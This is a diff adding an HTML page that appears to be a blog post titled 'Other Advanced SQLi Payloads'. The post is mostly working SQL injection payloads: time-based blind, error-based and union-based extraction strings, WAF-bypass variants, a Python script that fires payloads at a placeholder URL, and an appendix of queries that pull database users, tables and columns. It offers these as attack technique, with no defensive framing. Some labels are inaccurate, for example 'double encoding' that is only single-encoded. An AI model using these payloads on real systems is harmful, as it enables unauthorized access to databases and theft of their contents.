@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Other Advanced SQLi Payloads | ByteShifters</title>
+<meta property="og:title" content="Other Advanced SQLi Payloads | ByteShifters" />
+<meta name="twitter:title" content="Other Advanced SQLi Payloads | ByteShifters" />
+<meta itemprop="name" content="Other Advanced SQLi Payloads | ByteShifters" />
+<meta name="application-name" content="Other Advanced SQLi Payloads | ByteShifters" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="article:published_time" content=2024-10-03T00:00:00Z />
+    <meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/" />
+
+    
+    <meta property="og:article:author" content="ByteShifters" />
+    <meta property="article:author" content="ByteShifters" />
+    <meta name="author" content="ByteShifters" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Other Advanced SQLi Payloads",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-10-03",
+        "description": "",
+        "wordCount":  743 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-10-03",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "ByteShifters"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.122.0">
+
+    
+    <meta property="og:title" content="Other Advanced SQLi Payloads" />
+<meta property="og:description" content="1. Time-Based Blind SQL Injection with Complex Payloads Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.
+Payload: &#39; AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;77,SLEEP(5),0)-- Explanation: This payload uses conditional statements to delay the response if the first character of the database name is greater than &lsquo;M&rsquo;. It helps in extracting data one character at a time." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-10-03T00:00:00+00:00" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Other Advanced SQLi Payloads"/>
+<meta name="twitter:description" content="1. Time-Based Blind SQL Injection with Complex Payloads Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.
+Payload: &#39; AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;77,SLEEP(5),0)-- Explanation: This payload uses conditional statements to delay the response if the first character of the database name is greater than &lsquo;M&rsquo;. It helps in extracting data one character at a time."/>
+
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+
+    <link rel="canonical" href="https://byteshifters.com/posts/hacking/sql-injections/other-advanced-sqli-payloads/">
+    <link href="/style.min.a65edcf99b5d9c11dd8dc9c13f2e80eec76933d8449c8579cefe3c64191b71d4.css" rel="stylesheet">
+    <link href="/code-highlight.min.3dea1c7a362e3a7df3392c75d19c1efa95b2e82aa030c322a07a6caf50cb8e9a.css" rel="stylesheet">
+
+    
+    <link rel="icon" type="image/png+xml" href="/icons/logo32.png">
+    
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/logo32.png">
+    
+
+
+
+
+<link rel="manifest" href="https://byteshifters.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#cccccc">
+
+    
+    <link rel="icon" type="image/png"  sizes="32x32" href="/icons/logo32.png">
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://byteshifters.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/contact/">
+                        Contact
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Other Advanced SQLi Payloads</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-10-03T00:00:00&#43;00:00" itemprop="datePublished"> Oct 3, 2024 </time>
+                </div>
+                
+                
+                <div class="tags-list"><a href="https://byteshifters.com/tags/hacking/">#Hacking</a>
+                            <a href="https://byteshifters.com/tags/sqli/">#SQLi</a>
+                            </div>
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b></b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-time-based-blind-sql-injection-with-complex-payloads">1. Time-Based Blind SQL Injection with Complex Payloads</a>
+      <ul>
+        <li><a href="#payload">Payload:</a></li>
+        <li><a href="#explanation">Explanation:</a>
+          <ul>
+            <li><a href="#how-it-works">How it Works:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-boolean-based-blind-sql-injection-with-large-payloads">2. Boolean-Based Blind SQL Injection with Large Payloads</a>
+      <ul>
+        <li><a href="#payload-1">Payload:</a></li>
+        <li><a href="#explanation-1">Explanation:</a>
+          <ul>
+            <li><a href="#how-it-works-1">How it Works:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-union-based-sql-injection-with-multiple-statements">3. Union-Based SQL Injection with Multiple Statements</a>
+      <ul>
+        <li><a href="#payload-2">Payload:</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-error-based-sql-injection-with-advanced-payloads">4. Error-Based SQL Injection with Advanced Payloads</a>
+      <ul>
+        <li><a href="#payload-3">Payload:</a></li>
+        <li><a href="#explanation-2">Explanation:</a>
+          <ul>
+            <li><a href="#how-it-works-2">How it Works:</a></li>
+          </ul>
+        </li>
+        <li><a href="#example-use-case">Example Use Case:</a></li>
+      </ul>
+    </li>
+    <li><a href="#waf-bypass-techniques">WAF Bypass Techniques</a>
+      <ul>
+        <li><a href="#double-encoding">Double Encoding</a></li>
+        <li><a href="#payload-4">Payload:</a></li>
+        <li><a href="#explanation-3">Explanation:</a></li>
+        <li><a href="#case-variation">Case Variation</a></li>
+        <li><a href="#payload-5">Payload:</a></li>
+        <li><a href="#explanation-4">Explanation:</a></li>
+        <li><a href="#comment-obfuscation">Comment Obfuscation</a></li>
+        <li><a href="#payload-6">Payload:</a></li>
+        <li><a href="#explanation-5">Explanation:</a></li>
+      </ul>
+    </li>
+    <li><a href="#automating-sql-injection-with-python">Automating SQL Injection with Python</a>
+      <ul>
+        <li><a href="#sample-python-script-for-automating-sql-injection">Sample Python Script for Automating SQL Injection</a></li>
+        <li><a href="#script">Script:</a></li>
+        <li><a href="#explanation-6">Explanation:</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix-additional-payloads-and-resources">Appendix: Additional Payloads and Resources</a>
+      <ul>
+        <li><a href="#additional-payloads">Additional Payloads</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="1-time-based-blind-sql-injection-with-complex-payloads">1. Time-Based Blind SQL Injection with Complex Payloads</h2>
+<p>Time-based blind SQL injection relies on database responses based on time delays. This method is effective when the application does not return visible errors.</p>
+<h3 id="payload">Payload:</h3>
+<pre tabindex="0"><code>&#39; AND IF(ORD(MID((SELECT IFNULL(CAST(DATABASE() AS NCHAR),0x20)),1,1))&gt;77,SLEEP(5),0)--  
+</code></pre><h3 id="explanation">Explanation:</h3>
+<p>This payload uses conditional statements to delay the response if the first character of the database name is greater than &lsquo;M&rsquo;. It helps in extracting data one character at a time.</p>
+<h4 id="how-it-works">How it Works:</h4>
+<ul>
+<li><strong>ORD()</strong> function converts the character to its ASCII value.</li>
+<li><strong>MID()</strong> function extracts a substring from the result of the subquery.</li>
+<li><strong>IF()</strong> conditionally delays the response using <strong>SLEEP()</strong> based on the ASCII value.</li>
+</ul>
+<p>This payload is injected into a vulnerable parameter, causing the application to delay its response if the condition is true, helping to infer the value of the character.</p>
+<h2 id="2-boolean-based-blind-sql-injection-with-large-payloads">2. Boolean-Based Blind SQL Injection with Large Payloads</h2>
+<p>Boolean-based blind SQL injection exploits true or false conditions in SQL queries to extract information.</p>
+<h3 id="payload-1">Payload:</h3>
+<pre tabindex="0"><code>&#39; AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT (SELECT CONCAT(0x7e,0x27, DATABASE(), 0x27,0x7e)) FROM information_schema.tables LIMIT 1,1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--  
+</code></pre><h3 id="explanation-1">Explanation:</h3>
+<p>This payload uses a subquery to concatenate the database name with special characters and group by a random value, forcing the database to return a specific result.</p>
+<h4 id="how-it-works-1">How it Works:</h4>
+<ul>
+<li><strong>COUNT(*)</strong> counts the number of rows returned.</li>
+<li><strong>CONCAT()</strong> concatenates the database name with special characters.</li>
+<li><strong>RAND()</strong> generates a random number.</li>
+<li><strong>GROUP BY</strong> forces the query to execute the subquery, leading to an error if the condition is false.</li>
+</ul>
+<p>This payload helps in extracting information by observing the application&rsquo;s behavior based on the boolean condition.</p>
+<h2 id="3-union-based-sql-injection-with-multiple-statements">3. Union-Based SQL Injection with Multiple Statements</h2>
+<h3 id="payload-2">Payload:</h3>
+<pre tabindex="0"><code>&#39; UNION ALL SELECT NULL, CONCAT_WS(CHAR(58,45,45,58), user(), database(), version()), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL  
+</code></pre><h2 id="4-error-based-sql-injection-with-advanced-payloads">4. Error-Based SQL Injection with Advanced Payloads</h2>
+<p>Error-based SQL Injection relies on the database to generate errors that reveal information about the database structure and content. By crafting payloads that force the database to produce error messages, attackers can extract valuable data.</p>
+<h3 id="payload-3">Payload:</h3>
+<pre tabindex="0"><code>&#39; AND 1=CONVERT(int, (SELECT @@version))--  
+</code></pre><h3 id="explanation-2">Explanation:</h3>
+<p>This payload forces the database to convert a string value into an integer, generating an error that includes the database version. By manipulating the payload, attackers can retrieve different pieces of information from the error messages.</p>
+<h4 id="how-it-works-2">How it Works:</h4>
+<ul>
+<li>The <strong>CONVERT()</strong> function attempts to change the database version string into an integer.</li>
+<li>This causes an error, as the version string cannot be converted to an integer.</li>
+<li>The error message reveals the database version.</li>
+</ul>
+<h3 id="example-use-case">Example Use Case:</h3>
+<pre tabindex="0"><code>&#39; AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--  
+</code></pre><p>This payload generates an error revealing table names from the information_schema.tables.</p>
+<h2 id="waf-bypass-techniques">WAF Bypass Techniques</h2>
+<p>WAFs (Web Application Firewalls) often block common SQL injection patterns. Advanced techniques are required to bypass these defenses.</p>
+<h3 id="double-encoding">Double Encoding</h3>
+<h3 id="payload-4">Payload:</h3>
+<pre tabindex="0"><code>%27%20AND%201=1%20--%20  
+</code></pre><h3 id="explanation-3">Explanation:</h3>
+<p>This payload uses double URL encoding to bypass WAF filters that only decode input once.</p>
+<h3 id="case-variation">Case Variation</h3>
+<h3 id="payload-5">Payload:</h3>
+<pre tabindex="0"><code>&#39; aND 1=1 --  
+</code></pre><h3 id="explanation-4">Explanation:</h3>
+<p>This payload uses mixed case to evade case-sensitive WAF filters.</p>
+<h3 id="comment-obfuscation">Comment Obfuscation</h3>
+<h3 id="payload-6">Payload:</h3>
+<pre tabindex="0"><code>&#39;/**/AND/**/1=1--  
+</code></pre><h3 id="explanation-5">Explanation:</h3>
+<p>This payload inserts comments between keywords to bypass simplistic pattern matching filters.</p>
+<h2 id="automating-sql-injection-with-python">Automating SQL Injection with Python</h2>
+<p>Automating SQL Injection can save time and increase efficiency. Python, with its versatile libraries, is an excellent choice for creating automated tools.</p>
+<h3 id="sample-python-script-for-automating-sql-injection">Sample Python Script for Automating SQL Injection</h3>
+<h3 id="script">Script:</h3>
+<pre tabindex="0"><code>import requests  
+
+def sqli_test(url, payload):  
+    full_url = f&#34;{url}{payload}&#34;  
+    response = requests.get(full_url)  
+    return response.text  
+
+def main():  
+    url = &#39;http://example.com/vulnerable_page.php?id=&#39;  
+    payloads = [  
+        &#34;&#39; AND 1=1 -- &#34;,  
+        &#34;&#39; AND 1=2 -- &#34;,  
+        &#34;&#39; UNION SELECT NULL, CONCAT_WS(CHAR(58,45,45,58), user(), database(), version()), NULL -- &#34;  
+    ]  
+
+    for payload in payloads:  
+        result = sqli_test(url, payload)  
+        if &#34;error&#34; in result or &#34;You have an error in your SQL syntax&#34; in result:  
+            print(f&#34;Potential SQL Injection vulnerability found with payload: {payload}&#34;)  
+            print(result)  
+
+if __name__ == &#34;__main__&#34;:  
+    main()  
+</code></pre><h3 id="explanation-6">Explanation:</h3>
+<ul>
+<li>The script defines a function <strong>sqli_test()</strong> to send HTTP GET requests with SQLi payloads.</li>
+<li>The <strong>main()</strong> function iterates over a list of payloads, sending each to the target URL.</li>
+<li>The script checks the response for typical SQL error messages, indicating a potential vulnerability.</li>
+</ul>
+<h2 id="appendix-additional-payloads-and-resources">Appendix: Additional Payloads and Resources</h2>
+<h3 id="additional-payloads">Additional Payloads</h3>
+<ul>
+<li><strong>Extracting Database Users:</strong></li>
+</ul>
+<pre tabindex="0"><code>&#39; UNION SELECT NULL, user() --  
+</code></pre><ul>
+<li><strong>Extracting Table Names:</strong></li>
+</ul>
+<pre tabindex="0"><code>&#39; UNION SELECT NULL, table_name FROM information_schema.tables --  
+</code></pre><ul>
+<li><strong>Extracting Column Names:</strong></li>
+</ul>
+<pre tabindex="0"><code>&#39; UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; --  
+</code></pre>
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        
+        byteshifters.com
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://byteshifters.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
